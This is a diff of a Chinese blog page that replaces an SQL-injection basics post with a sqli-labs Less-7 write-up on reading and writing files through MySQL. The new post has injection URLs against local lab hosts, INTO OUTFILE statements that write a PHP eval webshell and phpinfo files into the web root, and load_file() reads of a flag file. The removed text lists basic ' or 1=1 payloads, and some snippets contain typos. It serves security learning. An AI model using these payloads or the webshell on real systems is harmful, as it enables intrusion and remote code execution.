@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>sqli手注基础 - SuQieR&#39;s Blog</title>
+  <title>sqli-less7读写文件 - SuQieR&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -152,7 +152,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727145833.jpg') no-repeat center center;
+         style="background: url('https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815150557.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -165,8 +165,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-07-27 11:29">
-      July 27, 2020 am
+    <time datetime="2020-08-01 23:03">
+      August 1, 2020 pm
     </time>
   </div>
 
@@ -176,7 +176,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      794 字
+      853 字
     </span>
   
 
@@ -186,7 +186,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      13
        分钟
     </span>
   
@@ -217,106 +217,203 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h1 id="sql-labs-手注"><a href="#sql-labs-手注" class="headerlink" title="sql-labs 手注"></a>sql-labs 手注</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
-<li>早在之前就接触过sql-labs，前两次加起来好像是过了前面十几关把，且也没有详细的做笔记。一两个月没接触，基本忘的差不多了，所以才有了这次三刷sql-labs。</li>
-<li>靶场搭建，其实很简单改一下数配置文件数据库连接密码就行了。这里这里直接略过，不会的话移步百度。</li>
-</ul>
-<h2 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h2><ol>
-<li><p>sql注入的分类</p>
+              <h1 id="sqli-less7-读写文件"><a href="#sqli-less7-读写文件" class="headerlink" title="sqli-less7 读写文件"></a>sqli-less7 读写文件</h1><h2 id="mysql开启读写权限"><a href="#mysql开启读写权限" class="headerlink" title="mysql开启读写权限"></a>mysql开启读写权限</h2><ul>
+<li><p>在进行读写操作前要先解决一个问题，就是打开mysql读写权限。</p>
+</li>
+<li><p>问题记录</p>
+<table>
+<thead>
+<tr>
+<th align="center">mysql使用load_file()函数查询存在文件时返回null</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815121933.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
 <ul>
-<li>基于服务器接受到的响应分类<ul>
-<li>基于错误的sql注入</li>
-<li>联合查询的类型</li>
-<li>堆查询注入</li>
-<li>sql盲注<ul>
-<li>基于布尔的sql盲注</li>
-<li>基于时间的sql盲注</li>
-<li>基于报错的sql盲注</li>
-</ul>
+<li><p>查询官方文档得知，mysql5.0以上版本下<code>secure-file-priv</code>字段是用来限制<code>load_file</code> ,<code>out_file</code> 和<code>load_file</code>上传到哪个指定目录</p>
+</li>
+<li><p>mysql导入导出的三个状态</p>
+<table>
+<thead>
+<tr>
+<th align="center">状态</th>
+<th align="center">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">ure_file_priv值为null</td>
+<td align="center">不允许导入导出</td>
+</tr>
+<tr>
+<td align="center">secure_file_priv为/tmp/</td>
+<td align="center">限制mysql的导入导出只能在/tmp/目录下</td>
+</tr>
+<tr>
+<td align="center">secure_file_priv没有具体值</td>
+<td align="center">允许导入导出</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>查看secure_file_priv的值</p>
+<table>
+<thead>
+<tr>
+<th align="center">show global variables like ‘%secure%’;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815123142.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>默认值为null ,不允许导入导出</p>
 </li>
 </ul>
 </li>
-<li>基于如何处理输入的sql注入<ul>
-<li>字符串类型</li>
-<li>数字类型</li>
-</ul>
-</li>
-<li>基于程度和顺序的注入<ul>
-<li>一阶注入(一阶注入指的是输入的sql语句直接对web服务产生了影响)</li>
-<li>二阶注入(二阶则是类似存储xss，指提交的sql语句无法对web服务产生影响，但可以通过其他辅助间接触发对web的伤害)</li>
-</ul>
-</li>
-<li>基于注入点的分类<ul>
-<li>通过用户输入的表单域的注入</li>
-<li>通过cookie的注入</li>
-<li>通过服务器变量的注入(头部注入)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>常用函数</p>
+<li><p>解决</p>
 <ul>
-<li>系统函数<ul>
-<li>version()  –&gt; Mysql版本</li>
-<li>user() –&gt; 数据库用户名</li>
-<li>database() –&gt; 数据库名</li>
-<li>@@datadir –&gt;数据库路径</li>
-<li>@@version_compile_os –&gt; 操作系统版本</li>
+<li>修改mysql.ini文件，在[mysqld]下加入<code>secure_file_priv =</code>保存，重启，再次查询</li>
 </ul>
-</li>
-<li>字符串连接函数<ul>
-<li>concat(str1,str2,…) 没有分隔符的连接字符串</li>
-<li>concat_ws((separator,str1, str2) 含有分割符的连接字符串</li>
-<li>group_concat(str1,str2)  连接一个组的所有字符串，并以逗号分隔每一条数据</li>
-<li>上面的解释比较抽象，其实也不用了解的这么详细，只需要知道这三个函数能一次性查出信息就行了</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>一般用于尝试的语句</p>
-<ul>
-<li><p>–+ 可以用#替换，url提交过程中#号经过url编码后为%23</p>
-<ul>
-<li>or 1=1 –+</li>
-<li>‘  or 1=1 –+</li>
-<li>“  or 1=1 –+</li>
-<li>) or 1=1 –+</li>
-<li>‘) or 1=1 –+</li>
-<li>“) or 1=1 –+</li>
-<li>“)) or 1=1 –+</li>
-</ul>
-</li>
-<li><p>一般的代码为:</p>
-<pre><code class="hljs php">$id = $_GET[<span class="hljs-string">'id'</span>];
-$sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"</span></code></pre>
-
-<ul>
-<li>此处应该考虑两个点，一个是闭合前面的’，一个是处理后面的’，采用两种思路，闭合后面的引号或者注释点，注释采用–+或#(%23)</li>
-</ul>
+<table>
+<thead>
+<tr>
+<th align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815123914.png" srcset="/img/loading.gif" alt=""></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815145845.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">尝试读取文件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815145752.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
 </li>
 </ul>
-</li>
-<li><p>information_schema数据库</p>
-<ul>
-<li><p>information_schema数据库只有在mysql5.0以上的版本才有，该数据库中存放着其他数据库的信息，这里需要记得是里面的几个表是干嘛的就行了</p>
-<ul>
-<li>SCHEMATA –&gt; 存储数据库名，关键字段：SCHEMA_NAME，表示数据库名称。show databases()的结果就是取自于此。</li>
-<li>TABLES –&gt; 存储表名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示表的名称。</li>
-<li>COLUMNS —-―&gt;存储字段名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示所属的表的名称，COLUMN_NAME表示字段名。</li>
-</ul>
-<pre><code class="hljs sql">猜数据库
-<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata 
-猜某库的表
-<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=’xxxxx’ 
-猜某表的列
-<span class="hljs-keyword">Select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=’xxxxx’ 
-获取某列的所有内容
-<span class="hljs-keyword">Select</span> *** <span class="hljs-keyword">from</span> ****</code></pre>
-
-</li>
-</ul>
-</li>
+<h2 id="导出文件"><a href="#导出文件" class="headerlink" title="导出文件"></a>导出文件</h2><ul>
+<li>select … load_file(“file_name”)</li>
+<li>在使用load_file()导出文件，需要满足以下条件。如果文件不存在，或下面的任一原因，load_file()函数会返回空。在windows下如果设置了ntfs权限，则不能读取相关文件。<ol>
+<li>必须有权限读取并文件须完全可读</li>
+<li>欲读取文件须在服务器上存在</li>
+<li>必须指定文件的完整路径</li>
+<li>读取文件必须小于max_allowed_packet(该字段说用来限制最大传输的值，超过会报错)</li>
 </ol>
+</li>
+<li>注入中需要注意的三点<ol>
+<li>绝对物理路径</li>
+<li>构造可执行的畸形语句</li>
+<li>在导出文件中常用路径：<code>https://www.cnblogs.com/lcamry/p/5729087.html</code></li>
+</ol>
+</li>
+</ul>
+<h2 id="导入文件"><a href="#导入文件" class="headerlink" title="导入文件"></a>导入文件</h2><ul>
+<li><p>select … into outfile “file_name” </p>
+</li>
+<li><p>该文件创建在目标服务器上，需要写入者必须拥有file权限，才能使用此语法。file_name 不能说一个以存在的文件。</p>
+</li>
+<li><p>两种常用的利用形式记注意事项</p>
+<ol>
+<li>将select 内容导入到文件中：</li>
+</ol>
+<pre><code class="hljs mysql">select version() into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre>
+
+<ul>
+<li>将上一个的version()替换成一句话，<code>&lt;?php @eval($_POST[passwd])?&gt;</code>,即</li>
+</ul>
+<pre><code class="hljs mysql">select &lt;?php @eval($_POST[passwd])?&gt; into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre>
+
+<ol start="2">
+<li>修改文件结尾：</li>
+</ol>
+<pre><code class="hljs mysql">select version() into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39; lines thrminated by 0x16进制文件</code></pre>
+
+<ul>
+<li>by 后面的内容，通常为<code>\r\n</code>,此处可以修改by后面的十六进制文件。（sqlmap –os-shell参数用的就是这个方法）</li>
+</ul>
+<ol start="3">
+<li>注意事项</li>
+</ol>
+<ul>
+<li>文件路径可能要转义，这个视环境而定。</li>
+<li>如果load_file无法导出文件时，可以使用这个语句</li>
+</ul>
+<pre><code class="hljs mysql">select load_file(&quot;c:&#x2F;&#x2F;flag.txt&quot;) into outfile  &#39;C:\phpstudy_pro\WWW\sqli\Less-7\test.php&#39;</code></pre>
+
+
+
+</li>
+</ul>
+<h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><ul>
+<li><p>从源代码中得知，查询语句对id参数进行了’))处理</p>
+<table>
+<thead>
+<tr>
+<th align="center">$sql=”SELECT*FROMusersWHEREid=((‘$id’))LIMIT0,1”;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815132444.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>这里可以用’)) or 1=1 –+进行注入</p>
+<table>
+<thead>
+<tr>
+<th align="center"><a href="http://192.168.5.135/sqli/Less-7/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-7/?id=1&#39;</a>)) or 1=1 –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815133500.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>用上述的方法写入文件</p>
+<pre><code class="hljs mysql">union select 1,&lt;?php phpinfo()?&gt;,3 into outfile &#39;C:\phpstudy_pro\WWW\sqli\Less-7\1.php&#39;</code></pre>
+
+<ul>
+<li>这里可能是phpstudy的问题，写入成功了，但是没有解析php</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center"><a href="http://192.168.3.5:80/sql/Less-7/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.3.5:80/sql/Less-7/?id=-1&#39;</a>)) union select 1,”&lt;php phpinfo() ;?&gt;”,3 into outfile “C://wamp/www/sql/Less-7/2.php”–+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815143751.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+<h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><ul>
+<li><p>less7没有回显，改用less1进行操作</p>
+<pre><code class="hljs mysql">union select 1,load_file(&#39;c:&#x2F;&#x2F;flag.txt&#39;) --+</code></pre>
+
+<table>
+<thead>
+<tr>
+<th align="center"><a href="http://192.168.5.135/sqli/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-1/?id=-1&#39;</a> union select 1,load_file(“C://flag.txt”),3 –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200815144258.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul>
+<li>这个读写文件路径问题真的是个大坑，需要注意</li>
+<li>还有系统环境也是个坑，分别用wamp和phpstudy搭建，出现的问题都不一样。</li>
+</ul>
 
             </article>
             <hr>
@@ -347,18 +444,12 @@ $sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"<
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/07/30/sqli-less1-4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sqli_less1-4</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/07/24/docker-compose%E5%B0%8F%E8%AE%B0/">
-                        <span class="hidden-mobile">docker-compose小记</span>
+                      <a href="/2020/08/01/sqli-less5-6%E7%9B%B2%E6%B3%A8/">
+                        <span class="hidden-mobile">sqli-less5-6盲注</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -517,7 +608,7 @@ $sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"<
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "sqli手注基础&nbsp;",
+        "sqli-less7读写文件&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
